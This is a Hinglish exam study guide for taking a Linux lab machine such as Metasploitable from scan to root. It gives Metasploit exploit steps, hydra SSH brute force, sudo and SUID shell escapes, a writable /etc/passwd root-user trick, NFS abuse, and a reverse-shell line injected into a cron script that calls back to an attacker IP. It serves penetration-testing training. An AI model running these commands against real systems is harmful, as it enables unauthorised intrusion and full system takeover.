# LINUX FULL PWN: Scan se Root Tak — Poori Methodology

---

## Ye Kya Hai?
Jab tujhe ek Linux machine ka IP milta hai exam mein, tujhe usse hack karke root banana hai
aur flag padhna hai. Ye poora process hota hai:
**Recon → Service Exploit → User Shell → Privilege Escalation → Root → Flag**

Har phase mein kya karna hai, kyu karna hai, aur output mein kya dekhna hai — sab yahan hai.

---

## PHASE 1: RECON — Pehle Dekh Kya Khula Hai (5 min max)

### Nmap Full Scan
```bash
nmap -sV -sC -p- -T4 <TARGET_IP>
```
**Flags ka matlab:**
- `-sV` = Service version detect karo (sirf port nahi, exact version batao)
- `-sC` = Default scripts chalao (anonymous FTP check, SSL info, etc.)
- `-p-` = SAARE 65535 ports scan karo (sirf top 1000 nahi)
- `-T4` = Fast speed (T5 se packets drop hote hain, T4 sweet spot hai)

### Output Mein Kya Dekh:
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4        ← BACKDOOR wala version!
22/tcp   open  ssh         OpenSSH 4.7          ← brute force ya key reuse
80/tcp   open  http        Apache 2.2.8         ← web vulnerabilities
445/tcp  open  netbios-ssn Samba 3.0.20         ← usermap_script exploit
1524/tcp open  bindshell   Metasploitable root  ← INSTANT WIN!
6667/tcp open  irc         UnrealIRCd           ← backdoor exploit
```

**Agar nmap slow chal raha hai:**
```bash
nmap -sV -sC -T4 <IP>           # Top 1000 ports pehle
nmap -p- -T4 <IP>               # Background mein full scan
```

---

## PHASE 2: EXPLOIT — Service Ke Basis Pe Attack Chun

### Ye table yaad rakh — port dikha, attack samajh:

| Port | Service | Attack | Command |
|------|---------|--------|---------|
| 21 | FTP (vsftpd 2.3.4) | Backdoor exploit | Metasploit `vsftpd_234_backdoor` |
| 21 | FTP (any) | Anonymous login check | `ftp <IP>` → user: anonymous |
| 22 | SSH | Brute force / key reuse | `hydra -l root -P rockyou.txt ssh://<IP>` |
| 80 | HTTP | Web vuln (SQLi, LFI, RCE) | `gobuster`, `nikto`, manual test |
| 445 | SMB (Samba 3.x) | usermap_script | Metasploit `usermap_script` |
| 1524 | Bindshell | Direct connect = root! | `nc <IP> 1524` |
| 6667 | IRC (UnrealIRCd) | Backdoor exploit | Metasploit `unreal_ircd_3281_backdoor` |

### Samba usermap_script Exploit (Most Common in Labs):
```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
run
```
**Kyu kaam karta hai:** Samba 3.0.20-3.0.25rc3 mein username field mein command inject ho jata hai

### vsftpd 2.3.4 Backdoor:
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET_IP>
run
```
**Kyu kaam karta hai:** Is version mein `:)` smile wala backdoor hai jo port 6200 pe shell deta hai

### Port 1524 Bindshell (Easiest Win):
```bash
nc <TARGET_IP> 1524
whoami
# root — bas ho gaya!
```
**Kyu kaam karta hai:** Metasploitable pe ye port direct root shell deta hai — koi exploit ki zaroorat nahi

---

## PHASE 3: POST-EXPLOIT — Shell Mila, Ab Info Gather Karo

### Shell milte hi ye commands daalo:
```bash
whoami                    # Kaun hu main? root ya user?
id                        # UID kya hai? 0 = root
hostname                  # Machine ka naam
uname -a                  # Kernel version (privesc ke liye chahiye)
cat /etc/issue            # OS version
ip addr                   # Network info
```

### Agar unstable shell hai (Ctrl+C se shell marr jaata hai):
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ya python3:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Phir:
export TERM=xterm
# Background: Ctrl+Z
stty raw -echo; fg
```
**Ye kyu karna hai:** Raw shell mein tab completion nahi hota, Ctrl+C se shell band ho jaata hai.
Upgraded shell proper terminal jaisa behave karta hai.

---

## PHASE 4: PRIVILEGE ESCALATION — User Se Root Tak

**Agar whoami ne root nahi bataya, toh privesc karna padega.**
**IMPORTANT: In checks ko ORDER mein karo — easy se hard:**

### CHECK 1: sudo -l (SABSE PEHLE YE KARO)
```bash
sudo -l
```
**Output mein kya dekh:**
```
User www-data may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/vi
```
Matlab: vi ko sudo se bina password ke chala sakta hai.

| sudo Output Mein Ye Dikhe | Ye Karo (GTFOBins se) |
|---|---|
| `(ALL) NOPASSWD: ALL` | `sudo su` ya `sudo bash` — DONE! |
| `NOPASSWD: /usr/bin/vi` | `sudo vi -c ':!bash'` |
| `NOPASSWD: /usr/bin/vim` | `sudo vim -c ':!bash'` |
| `NOPASSWD: /usr/bin/python` | `sudo python -c 'import os;os.system("/bin/bash")'` |
| `NOPASSWD: /usr/bin/python3` | `sudo python3 -c 'import os;os.system("/bin/bash")'` |
| `NOPASSWD: /usr/bin/find` | `sudo find / -exec /bin/bash \;` |
| `NOPASSWD: /usr/bin/awk` | `sudo awk 'BEGIN{system("/bin/bash")}'` |
| `NOPASSWD: /usr/bin/less` | `sudo less /etc/passwd` phir type `!bash` |
| `NOPASSWD: /usr/bin/nmap` | `sudo nmap --interactive` phir `!sh` (old nmap) |
| `NOPASSWD: /usr/bin/perl` | `sudo perl -e 'exec "/bin/bash";'` |
| `NOPASSWD: /usr/bin/env` | `sudo env /bin/bash` |
| `NOPASSWD: /usr/bin/man` | `sudo man man` phir `!bash` |

**GTFOBins kya hai:** gtfobins.github.io pe har Linux binary ke liye sudo/SUID exploit milega

### CHECK 2: SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```
**SUID kya hai:** Jab koi binary pe SUID bit set hota hai, wo binary owner ki permissions se
chalti hai (usually root). Agar SUID binary mein shell escape hai → root!

**Output example:**
```
/usr/bin/find
/usr/bin/vim
/usr/bin/nmap
/usr/bin/python
```
Ye sabke liye GTFOBins pe SUID section dekh. Example:
```bash
# find with SUID:
find . -exec /bin/bash -p \;
# -p flag bash ko effective UID (root) drop nahi karne deta
```

### CHECK 3: Writable /etc/passwd
```bash
ls -la /etc/passwd
```
Agar `-rw-rw-rw-` hai ya tere user ko write access hai:
```bash
# New root user add karo:
openssl passwd -1 pass123
# Output copy karo, phir:
echo 'hacker:COPIED_HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
# Password: pass123 → ab tu root hai!
```

### CHECK 4: Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l
```
**Cron kya hai:** Scheduled tasks jo automatically chalte hain. Agar koi cron job root se chal
raha hai AUR uski script writable hai → reverse shell inject karo!
```bash
# Check if script is writable:
ls -la /path/to/cron_script.sh
# Writable hai? Inject karo:
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /path/to/cron_script.sh
# Listener start karo apni machine pe:
nc -lvnp 4444
```

### CHECK 5: NFS no_root_squash
```bash
cat /etc/exports
showmount -e <TARGET_IP>        # Apni machine se
```
**no_root_squash kya hai:** Normally jab tu NFS share mount karta hai as root, server tera
root access "squash" karke nobody bana deta hai. Lekin `no_root_squash` mein ye nahi hota —
tu apni machine pe root se SUID binary bana sakta hai, mount pe rakh sakta hai, target pe
execute karke root mil jaata hai!
```bash
# Apni machine pe (as root):
mkdir /tmp/nfs
mount -o rw <TARGET_IP>:/shared_folder /tmp/nfs
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash
# Target pe:
/shared_folder/rootbash -p      # Root shell!
```

### CHECK 6: Kernel Exploit (Last Resort)
```bash
uname -r                         # Kernel version
cat /etc/issue                   # OS version
```
| Kernel Version | Exploit | CVE |
|---|---|---|
| < 3.9 | DirtyCow | CVE-2016-5195 |
| < 5.8 | PwnKit (pkexec) | CVE-2021-4034 |

```bash
searchsploit linux kernel <version>
# Compile karo, upload karo, run karo
```
**Kyu last resort:** Kernel exploits system crash kar sakte hain. Pehle doosre methods try karo.

### CHECK 7: LinPEAS (Automated Scanner)
```bash
# Apni machine pe server start karo:
python3 -m http.server 8888
# Target pe download karo:
wget http://YOUR_IP:8888/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
**LinPEAS kya karta hai:** Ye sab checks automatically karta hai aur RED/YELLOW mein
highlight karta hai jo exploit ho sakta hai. Bohot time bachata hai.

---

## PHASE 5: FLAG DHUNDHO

```bash
cat /root/flag.txt
cat /root/proof.txt
find / -name "flag*" 2>/dev/null
find / -name "proof*" 2>/dev/null
find / -name "*.txt" -path "*/root/*" 2>/dev/null
ls -la /root/
```

---

## Common Mistakes (Mat Karna Ye)

1. **sudo -l skip karna** — Ye sabse easy privesc hai, PEHLE karo
2. **Shell upgrade nahi karna** — Raw shell mein kaam karna mushkil hai, pehle upgrade karo
3. **Kernel exploit pehle try karna** — System crash ho sakta hai, pehle easy methods dekho
4. **`2>/dev/null` nahi lagana** — Errors se output unreadable ho jaata hai
5. **LHOST galat dalna** — Apna attacker IP daalo, target ka nahi (ifconfig/ip addr se check karo)
6. **nmap -p- skip karna** — High ports pe services miss ho jaati hain
7. **Version note nahi karna** — Version se exploit milta hai, always note karo

---

## Quick Decision Tree

```
Linux Target IP mila
  |
  +-- nmap -sV -sC -p- -T4 <IP>
  |     |
  |     +-- Port 1524? --> nc <IP> 1524 --> ROOT (instant!)
  |     +-- vsftpd 2.3.4? --> Metasploit backdoor
  |     +-- Samba 3.x? --> usermap_script
  |     +-- Port 80? --> Web enum (gobuster/nikto)
  |     +-- Port 22 only? --> hydra brute force
  |
  +-- Shell mila (whoami se check karo)
  |     |
  |     +-- root? --> Flag padho: cat /root/flag.txt
  |     +-- user? --> Privesc karo (neeche dekh)
  |
  +-- Privilege Escalation Order:
        |
        1. sudo -l --> GTFOBins check
        2. find / -perm -4000 --> SUID binaries
        3. ls -la /etc/passwd --> writable?
        4. cat /etc/crontab --> writable cron scripts?
        5. cat /etc/exports --> no_root_squash?
        6. uname -r --> kernel exploit (last resort)
        7. LinPEAS chala do (sab check ek saath)
        |
        +-- ROOT MILA --> cat /root/flag.txt
```
